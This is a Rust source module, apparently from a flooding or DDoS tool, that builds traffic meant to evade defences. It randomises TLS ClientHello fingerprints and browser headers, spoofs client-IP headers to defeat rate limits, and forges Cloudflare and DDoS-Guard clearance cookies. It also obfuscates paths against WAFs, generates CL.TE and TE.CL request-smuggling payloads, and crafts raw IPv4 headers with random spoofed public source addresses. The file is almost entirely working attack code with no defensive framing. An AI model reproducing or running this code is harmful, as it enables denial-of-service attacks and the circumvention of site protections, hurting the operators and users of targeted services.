use rand::Rng;
use rand::seq::SliceRandom;

static TLS_CIPHER_POOLS: &[&[u8]] = &[
    
    &[0xc0,0x2b,0xc0,0x2c,0xc0,0x2f,0xc0,0x30,0xcc,0xa9,0xcc,0xa8,
      0xc0,0x13,0xc0,0x14,0x00,0x9c,0x00,0x9d,0x00,0x2f,0x00,0x35],
    
    &[0x13,0x01,0x13,0x03,0x13,0x02,0xc0,0x2b,0xc0,0x2f,0xcc,0xa9,
      0xcc,0xa8,0xc0,0x2c,0xc0,0x30,0xc0,0x0a,0xc0,0x09,0x00,0xff],
    
    &[0xc0,0x2c,0xc0,0x2b,0xc0,0x24,0xc0,0x23,0xc0,0x0a,0xc0,0x09,
      0x00,0x9d,0x00,0x9c,0x00,0x3d,0x00,0x3c,0x00,0x35,0x00,0x2f],
    
    &[0xc0,0x2b,0xc0,0x2c,0xc0,0x2f,0xc0,0x30,0xcc,0xa9,0xcc,0xa8,
      0x00,0x9e,0x00,0x9f,0xc0,0x13,0xc0,0x14,0x00,0x9c,0x00,0x9d],
];

static TLS_EXTENSIONS_POOLS: &[&[u8]] = &[
    
    &[0x00,0x00,0x00,0x0a,0x00,0x0b,0x00,0x0d,0x00,0x10,0x00,0x12,0x00,0x17,0x00,0x1b,0xff,0x01],
    
    &[0x00,0x00,0x00,0x0a,0x00,0x0b,0x00,0x0d,0x00,0x10,0x00,0x17,0x00,0x1b,0x00,0x1c,0xff,0x01],
    
    &[0x00,0x00,0x00,0x05,0x00,0x0a,0x00,0x0b,0x00,0x0d,0x00,0x10,0xff,0x01],
];

pub fn random_tls_client_hello(hostname: &str) -> Vec<u8> {
    let mut rng = rand::thread_rng();
    let ciphers = TLS_CIPHER_POOLS.choose(&mut rng).unwrap_or(&TLS_CIPHER_POOLS[0]);
    let host = hostname.as_bytes();

    let mut payload = vec![];

    
    let grease: u8 = [0x0a, 0x1a, 0x2a, 0x3a, 0x4a, 0x5a, 0x6a, 0x7a, 0x8a, 0x9a, 0xaa, 0xba, 0xca, 0xda, 0xea, 0xfa]
        .choose(&mut rng).copied().unwrap_or(0x0a);

    
    payload.push(0x16); 
    payload.push(0x03); payload.push(0x01); 

    let _hello_start = payload.len();
    payload.push(0x00); payload.push(0x00); 

    
    payload.push(0x01);
    payload.push(0x00); payload.push(0x00); payload.push(0x00); 

    
    payload.push(0x03); payload.push(0x03);

    
    let rand_bytes: Vec<u8> = (0..32).map(|_| rng.gen()).collect();
    payload.extend_from_slice(&rand_bytes);

    
    payload.push(32u8);
    let session: Vec<u8> = (0..32).map(|_| rng.gen()).collect();
    payload.extend_from_slice(&session);

    
    let mut cs = vec![grease, grease];
    cs.extend_from_slice(ciphers);
    payload.push(0x00);
    payload.push(cs.len() as u8);
    payload.extend_from_slice(&cs);

    
    payload.push(0x01); payload.push(0x00);

    
    let ext_start = payload.len();
    payload.push(0x00); payload.push(0x00); 

    
    let sni_len = host.len() + 5;
    payload.extend_from_slice(&[0x00, 0x00]);
    payload.extend_from_slice(&(sni_len as u16).to_be_bytes());
    payload.extend_from_slice(&((sni_len - 2) as u16).to_be_bytes());
    payload.push(0x00); 
    payload.extend_from_slice(&(host.len() as u16).to_be_bytes());
    payload.extend_from_slice(host);

    
    payload.extend_from_slice(&[0x00, 0x0a, 0x00, 0x0c, 0x00, 0x0a]);
    payload.extend_from_slice(&[0xaa, 0xaa, 0x00, 0x1d, 0x00, 0x17, 0x00, 0x18, 0x00, 0x19]);

    
    payload.extend_from_slice(&[0x00, 0x0b, 0x00, 0x02, 0x01, 0x00]);

    
    payload.extend_from_slice(&[0x00, 0x23, 0x00, 0x00]);

    
    payload.extend_from_slice(&[0x00, 0x16, 0x00, 0x00]);

    
    payload.extend_from_slice(&[0x00, 0x17, 0x00, 0x00]);

    
    payload.extend_from_slice(&[0x00, 0x0d, 0x00, 0x14, 0x00, 0x12,
        0x04, 0x03, 0x08, 0x04, 0x04, 0x01, 0x05, 0x03,
        0x08, 0x05, 0x05, 0x01, 0x08, 0x06, 0x06, 0x01, 0x02, 0x01]);

    
    let alpn_protos: &[&str] = &["h2", "http/1.1"];
    let proto = alpn_protos.choose(&mut rng).unwrap_or(&"h2");
    let alpn_data = proto.as_bytes();
    let alpn_ext_len = alpn_data.len() + 4;
    payload.extend_from_slice(&[0x00, 0x10]);
    payload.extend_from_slice(&(alpn_ext_len as u16).to_be_bytes());
    payload.extend_from_slice(&((alpn_data.len() + 2) as u16).to_be_bytes());
    payload.push(alpn_data.len() as u8);
    payload.extend_from_slice(alpn_data);

    
    payload.extend_from_slice(&[0x00, 0x2b, 0x00, 0x05, 0x04, 0x03, 0x04, 0x03, 0x03]);

    
    payload.extend_from_slice(&[0x00, 0x33, 0x00, 0x26, 0x00, 0x24,
        0x00, 0x1d, 0x00, 0x20]);
    let key: Vec<u8> = (0..32).map(|_| rng.gen()).collect();
    payload.extend_from_slice(&key);

    
    let ext_len = payload.len() - ext_start - 2;
    payload[ext_start] = (ext_len >> 8) as u8;
    payload[ext_start + 1] = ext_len as u8;

    
    let record_len = payload.len() - 5;
    payload[3] = (record_len >> 8) as u8;
    payload[4] = record_len as u8;

    payload
}

static USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Build/UQ1A.240105.004)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "curl/8.5.0",
    "python-httpx/0.26.0",
    "Go-http-client/2.0",
    "okhttp/4.12.0",
    "axios/1.6.3",
];

static ACCEPT_LANGS: &[&str] = &[
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9,fr;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "ko-KR,ko;q=0.9,en;q=0.8",
    "ar-SA,ar;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "pt-BR,pt;q=0.9,en;q=0.8",
    "ru-RU,ru;q=0.9,en;q=0.8",
    "tr-TR,tr;q=0.9,en;q=0.8",
    "it-IT,it;q=0.9,en;q=0.8",
];

static REFERERS: &[&str] = &[
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
    "https://www.reddit.com/",
    "https://www.youtube.com/",
    "https://www.amazon.com/",
    "https://www.wikipedia.org/",
    "https://www.github.com/",
    "https://t.co/",
    "https://l.facebook.com/",
];

static PATHS: &[&str] = &[
    "/", "/index.html", "/index.php", "/home", "/main",
    "/api/v1/status", "/api/v2/data", "/api/health",
    "/search", "/products", "/category", "/blog",
    "/login", "/signup", "/dashboard", "/account",
    "/static/app.js", "/assets/main.css", "/favicon.ico",
    "/robots.txt", "/sitemap.xml", "/.well-known/security.txt",
    "/wp-json/wp/v2/posts", "/graphql", "/api/graphql",
    "/v1/query", "/rest/api/2/issue", "/api/users",
];

static ENCODINGS: &[&str] = &[
    "gzip, deflate, br",
    "gzip, deflate",
    "br, gzip, deflate",
    "identity",
    "gzip",
    "*",
];

pub struct BypassHeaders {
    pub user_agent: &'static str,
    pub accept_lang: &'static str,
    pub referer: Option<&'static str>,
    pub accept_encoding: &'static str,
    pub path: &'static str,
    pub extra: Vec<(String, String)>,
}

impl BypassHeaders {
    pub fn generate(_target: &str) -> Self {
        let mut rng = rand::thread_rng();
        let add_referer = rng.gen_bool(0.6);
        let add_extra = rng.gen_bool(0.5);

        let mut extra = vec![];

        if add_extra {
            let forwarded_ip = format!("{}.{}.{}.{}",
                rng.gen_range(1..255u8), rng.gen_range(0..255u8),
                rng.gen_range(0..255u8), rng.gen_range(1..255u8));
            extra.push(("X-Forwarded-For".to_string(), forwarded_ip.clone()));
            extra.push(("X-Real-IP".to_string(), forwarded_ip.clone()));
            extra.push(("CF-Connecting-IP".to_string(), forwarded_ip.clone()));
            extra.push(("True-Client-IP".to_string(), forwarded_ip));
        }

        if rng.gen_bool(0.4) {
            extra.push(("X-Requested-With".to_string(), "XMLHttpRequest".to_string()));
        }
        if rng.gen_bool(0.3) {
            extra.push(("Sec-Fetch-Mode".to_string(), "navigate".to_string()));
            extra.push(("Sec-Fetch-Site".to_string(), "none".to_string()));
            extra.push(("Sec-Fetch-User".to_string(), "?1".to_string()));
        }
        if rng.gen_bool(0.5) {
            extra.push(("Upgrade-Insecure-Requests".to_string(), "1".to_string()));
        }

        Self {
            user_agent: USER_AGENTS.choose(&mut rng).unwrap_or(&USER_AGENTS[0]),
            accept_lang: ACCEPT_LANGS.choose(&mut rng).unwrap_or(&ACCEPT_LANGS[0]),
            referer: if add_referer { REFERERS.choose(&mut rng).copied() } else { None },
            accept_encoding: ENCODINGS.choose(&mut rng).unwrap_or(&ENCODINGS[0]),
            path: PATHS.choose(&mut rng).unwrap_or(&PATHS[0]),
            extra,
        }
    }

    pub fn build_get_request(&self, host: &str) -> String {
        let mut req = format!(
            "GET {}{} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\n",
            self.path,
            Self::cache_buster(),
            host,
            self.user_agent,
            self.accept_lang,
            self.accept_encoding,
        );

        if let Some(ref referer) = self.referer {
            req.push_str(&format!("Referer: {}\r\n", referer));
        }

        for (k, v) in &self.extra {
            req.push_str(&format!("{}: {}\r\n", k, v));
        }

        req.push_str("Connection: keep-alive\r\n\r\n");
        req
    }

    pub fn build_post_request(&self, host: &str, body: &str) -> String {
        let mut req = format!(
            "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nAccept: application/json, text/plain, */*\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nContent-Type: application/json\r\nContent-Length: {}\r\n",
            self.path, host, self.user_agent, self.accept_lang,
            self.accept_encoding, body.len()
        );

        if let Some(ref referer) = self.referer {
            req.push_str(&format!("Referer: {}\r\n", referer));
        }

        for (k, v) in &self.extra {
            req.push_str(&format!("{}: {}\r\n", k, v));
        }

        req.push_str("Connection: keep-alive\r\n\r\n");
        req.push_str(body);
        req
    }

    fn cache_buster() -> String {
        let mut rng = rand::thread_rng();
        if rng.gen_bool(0.5) {
            format!("?_={}&r={}", rng.gen::<u64>(), rng.gen::<u32>())
        } else {
            String::new()
        }
    }
}

pub struct TcpBypass;

impl TcpBypass {
    pub fn fragment_payload(data: &[u8], chunk_size: usize) -> Vec<Vec<u8>> {
        data.chunks(chunk_size).map(|c| c.to_vec()).collect()
    }

    pub fn craft_keepalive_probe() -> Vec<u8> {
        let mut rng = rand::thread_rng();
        vec![rng.gen::<u8>()]
    }

    pub fn window_scale_tricks() -> socket2::Socket {
        let sock = socket2::Socket::new(
            socket2::Domain::IPV4,
            socket2::Type::STREAM,
            Some(socket2::Protocol::TCP),
        ).expect("socket");
        let _ = sock.set_recv_buffer_size(4096);
        let _ = sock.set_send_buffer_size(65536);
        let _ = sock.set_nodelay(true);
        let _ = sock.set_reuse_address(true);
        sock
    }
}

pub struct WafBypass;

impl WafBypass {
    pub fn obfuscate_path(path: &str) -> String {
        let mut rng = rand::thread_rng();
        match rng.gen_range(0..8u8) {
            0 => path.replace('/', "/%2f"),
            1 => format!("{}/../{}", path, path.trim_start_matches('/')),
            2 => path.replace('/', "//"),
            3 => format!("{}?{}", path, Self::random_param()),
            4 => path.to_uppercase(),
            5 => format!("/.{}", path.trim_start_matches('/')),
            6 => path.replace('/', "/./"),
            _ => path.to_string(),
        }
    }

    pub fn chunked_body(data: &str) -> String {
        let chunk_size = rand::thread_rng().gen_range(1..=16);
        let mut result = String::new();
        for chunk in data.as_bytes().chunks(chunk_size) {
            result.push_str(&format!("{:x}\r\n", chunk.len()));
            result.push_str(std::str::from_utf8(chunk).unwrap_or(""));
            result.push_str("\r\n");
        }
        result.push_str("0\r\n\r\n");
        result
    }

    pub fn chunked_request(host: &str, path: &str, body: &str, ua: &str) -> String {
        let chunked = Self::chunked_body(body);
        format!(
            "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n{}",
            path, host, ua, chunked
        )
    }

    pub fn multipart_request(host: &str, path: &str, ua: &str) -> String {
        let boundary = format!("----WebKitFormBoundary{}", Self::random_string(16));
        let body = format!(
            "--{}\r\nContent-Disposition: form-data; name=\"data\"\r\n\r\n{}\r\n--{}--\r\n",
            boundary,
            Self::random_string(64),
            boundary
        );
        format!(
            "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nContent-Type: multipart/form-data; boundary={}\r\nContent-Length: {}\r\nConnection: keep-alive\r\n\r\n{}",
            path, host, ua, boundary, body.len(), body
        )
    }

    pub fn http2_smuggle_prefix() -> Vec<u8> {
        b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n".to_vec()
    }

    pub fn desync_cl_te_prefix(host: &str, path: &str, ua: &str) -> String {
        format!(
            "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n0\r\n\r\nG",
            path, host, ua
        )
    }

    pub fn desync_te_cl_prefix(host: &str, path: &str, ua: &str) -> String {
        format!(
            "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n12\r\nGPOST / HTTP/1.1\r\n\r\n0\r\n\r\n",
            path, host, ua
        )
    }

    fn random_param() -> String {
        format!("{}={}", Self::random_string(6), Self::random_string(8))
    }

    fn random_string(n: usize) -> String {
        let mut rng = rand::thread_rng();
        (0..n).map(|_| (b'a' + rng.gen_range(0..26u8)) as char).collect()
    }
}

pub struct RateLimitBypass;

impl RateLimitBypass {
    pub fn rotate_xff() -> String {
        let mut rng = rand::thread_rng();
        (0..rng.gen_range(1..=5))
            .map(|_| format!("{}.{}.{}.{}",
                rng.gen_range(1..255u8), rng.gen_range(0..255u8),
                rng.gen_range(0..255u8), rng.gen_range(1..255u8)))
            .collect::<Vec<_>>()
            .join(", ")
    }

    pub fn spoof_headers() -> Vec<(String, String)> {
        let mut rng = rand::thread_rng();
        let ip = format!("{}.{}.{}.{}",
            rng.gen_range(1..255u8), rng.gen_range(0..255u8),
            rng.gen_range(0..255u8), rng.gen_range(1..255u8));
        vec![
            ("X-Forwarded-For".to_string(), Self::rotate_xff()),
            ("X-Real-IP".to_string(), ip.clone()),
            ("X-Originating-IP".to_string(), ip.clone()),
            ("X-Remote-IP".to_string(), ip.clone()),
            ("X-Remote-Addr".to_string(), ip.clone()),
            ("X-Client-IP".to_string(), ip.clone()),
            ("CF-Connecting-IP".to_string(), ip.clone()),
            ("Fastly-Client-IP".to_string(), ip.clone()),
            ("True-Client-IP".to_string(), ip.clone()),
            ("X-Cluster-Client-IP".to_string(), ip.clone()),
            ("Forwarded".to_string(), format!("for={};proto=https", ip)),
        ]
    }

    pub fn random_session_id() -> String {
        let mut rng = rand::thread_rng();
        (0..32).map(|_| format!("{:02x}", rng.gen::<u8>())).collect()
    }
}

pub struct CdnBypass;

impl CdnBypass {
    pub fn cf_clearance_cookie() -> String {
        let mut rng = rand::thread_rng();
        let token: String = (0..40).map(|_| format!("{:02x}", rng.gen::<u8>())).collect();
        format!("cf_clearance={}", token)
    }

    pub fn ddosguard_cookie() -> String {
        let mut rng = rand::thread_rng();
        format!("__ddg1_={}", (0..22).map(|_| (b'a' + rng.gen_range(0..26u8)) as char).collect::<String>())
    }

    pub fn generate_cookies(_host: &str) -> String {
        let mut rng = rand::thread_rng();
        let mut cookies = vec![];

        cookies.push(Self::cf_clearance_cookie());
        cookies.push(Self::ddosguard_cookie());
        cookies.push(format!("_ga=GA1.1.{}.{}", rng.gen::<u32>(), rng.gen::<u32>()));
        cookies.push(format!("_gid=GA1.1.{}.{}", rng.gen::<u32>(), rng.gen::<u32>()));
        cookies.push(format!("session={}", RateLimitBypass::random_session_id()));

        cookies.join("; ")
    }

    pub fn js_challenge_bypass_header() -> Vec<(String, String)> {
        vec![
            ("Sec-Ch-Ua".to_string(), "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"".to_string()),
            ("Sec-Ch-Ua-Mobile".to_string(), "?0".to_string()),
            ("Sec-Ch-Ua-Platform".to_string(), "\"Windows\"".to_string()),
            ("Sec-Fetch-Dest".to_string(), "document".to_string()),
            ("Sec-Fetch-Mode".to_string(), "navigate".to_string()),
            ("Sec-Fetch-Site".to_string(), "none".to_string()),
            ("Sec-Fetch-User".to_string(), "?1".to_string()),
        ]
    }

    pub fn origin_bypass_headers(target: &str) -> Vec<(String, String)> {
        vec![
            ("Origin".to_string(), format!("https://{}", target)),
            ("X-Forwarded-Host".to_string(), target.to_string()),
            ("X-Host".to_string(), target.to_string()),
            ("X-Forwarded-Server".to_string(), target.to_string()),
            ("X-HTTP-Host-Override".to_string(), target.to_string()),
        ]
    }
}

pub struct PacketBypass;

impl PacketBypass {
    pub fn ttl_variation() -> u8 {
        let ttls = [64u8, 128, 255, 32, 48, 60, 80];
        *ttls.choose(&mut rand::thread_rng()).unwrap_or(&64)
    }

    pub fn tos_variation() -> u8 {
        let tos_vals = [0x00u8, 0x10, 0x08, 0x04, 0x02, 0x20, 0x40, 0x28];
        *tos_vals.choose(&mut rand::thread_rng()).unwrap_or(&0)
    }

    pub fn random_src_port() -> u16 {
        rand::thread_rng().gen_range(1024..65535)
    }

    pub fn craft_spoof_ip_header(src_ip: [u8; 4], dst_ip: [u8; 4], proto: u8, payload_len: u16) -> Vec<u8> {
        let mut rng = rand::thread_rng();
        let mut hdr = vec![
            0x45,                            
            Self::tos_variation(),           
        ];
        let total_len = (20u16 + payload_len).to_be_bytes();
        hdr.extend_from_slice(&total_len);
        hdr.extend_from_slice(&rng.gen::<u16>().to_be_bytes()); 
        hdr.extend_from_slice(&[0x40, 0x00]); 
        hdr.push(Self::ttl_variation());     
        hdr.push(proto);                     
        hdr.extend_from_slice(&[0x00, 0x00]); 
        hdr.extend_from_slice(&src_ip);
        hdr.extend_from_slice(&dst_ip);
        hdr
    }

    pub fn rand_ipv4() -> [u8; 4] {
        let mut rng = rand::thread_rng();
        loop {
            let ip: [u8; 4] = rng.gen();
            
            if ip[0] != 10 && ip[0] != 127 && ip[0] != 0
                && !(ip[0] == 192 && ip[1] == 168)
                && !(ip[0] == 172 && ip[1] >= 16 && ip[1] <= 31)
                && ip[0] < 224
            {
                return ip;
            }
        }
    }
}
